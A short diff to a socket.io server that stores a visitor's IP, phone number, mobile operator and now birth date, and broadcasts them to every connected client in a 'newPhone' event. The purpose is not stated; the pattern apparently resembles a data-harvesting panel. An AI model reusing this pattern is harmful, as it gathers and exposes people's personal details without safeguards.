@@ -538,6 +538,7 @@ io.on('connection', socket => {
             ip: payload.ip,
             phoneNumber: payload.phoneNumber,
             operator: payload.operator,
+            birth: payload.birthDate ? new Date(payload.birthDate) : null,
             time: Date.now()
         });
 
@@ -545,8 +546,9 @@ io.on('connection', socket => {
         io.emit('newPhone', {
             ip: user.ip,
             phoneNumber: saved.phoneNumber,
-            operator: saved.operator, time: Date.now()
-
+            operator: saved.operator,
+            birth: saved.birth,
+            time: Date.now()
         });
 
         // 4) Acknowledge back to the visitor page
